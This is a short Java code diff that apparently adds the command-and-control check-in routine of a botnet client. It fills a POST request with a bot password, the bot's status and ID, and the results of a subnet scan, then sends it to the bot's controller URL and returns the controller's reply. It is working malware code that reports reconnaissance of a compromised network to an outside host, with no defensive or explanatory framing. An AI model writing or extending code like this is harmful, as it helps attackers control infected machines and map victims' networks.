@@ -118,7 +118,17 @@ public class CC_DataExchanger {
 
         myPostArray[0][0] = "botpwd";
         myPostArray[0][1] = myBot.ccInitialPwd;
-        myPostArray[1][0]
+        myPostArray[1][0] = "status";
+        myPostArray[1][1] = myBot.status;
+        myPostArray[2][0] = "botID";
+        myPostArray[2][1] = myBot.id;
+        myPostArray[3][0] = "subnetScan";
+        myPostArray[3][1] = subnetScanResults;
+
+        CC_Connector my_cc_Connector = new CC_Connector(myPostArray,
+                myBot.ccInitialURL, debug);
+
+        return my_cc_Connector.ccReply;
     }
 
     /**
